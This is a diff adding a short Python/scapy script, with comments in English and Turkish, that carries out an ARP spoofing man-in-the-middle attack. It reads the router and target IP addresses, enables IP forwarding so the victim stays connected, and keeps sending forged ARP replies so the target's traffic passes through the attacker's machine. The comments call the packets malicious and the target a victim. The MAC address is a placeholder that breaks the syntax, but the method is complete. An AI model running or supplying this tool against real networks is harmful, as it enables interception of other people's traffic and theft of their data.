@@ -1,0 +1,36 @@
+#!/usr/bin/python3
+
+# AUTHOR: CYB3RMX_
+
+import os
+from scapy.all import *
+
+def SendSpoof():
+    # [EN] Getting target and router ip.
+    # [TR] Hedefin ve yönlendiricinin ip adresini alıyoruz.
+    router = str(input("[+] Enter router ip: "))
+    target = str(input("[+] Enter target ip: "))
+
+    # [EN] Enabling ip forwarding so our victim's connection is continue
+    # [TR] IP forward ı etkinlestirip kurbanın baglantısının kesilmemesini sağlıyoruz
+    print("[*] Enabling IP forward...")
+    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    print("\n[*] Attacking to: %s"%(target))
+    try:
+        while True:
+            # [EN]
+            # Sending malicious arp packets to target
+            # Just enter your mac adress to 'hwsrc' => hwsrc=MAC_ADDR
+
+            # [TR]
+            # Zararlı arp paketlerini hedefe gönderiyoruz
+            # hwsrc kısmına kendi MAC adresinizi yazmanız yeterli
+            send(ARP(op=2, pdst=target, hwsrc=[ENTER YOUR MAC], psrc=router), verbose=0)
+    except:
+        # [EN] Terminating the program
+        # [TR] Program kapanırken yapılan işler
+        print("[*] Disabling IP forward...")
+        os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print("[!] Program terminated.")
+SendSpoof()
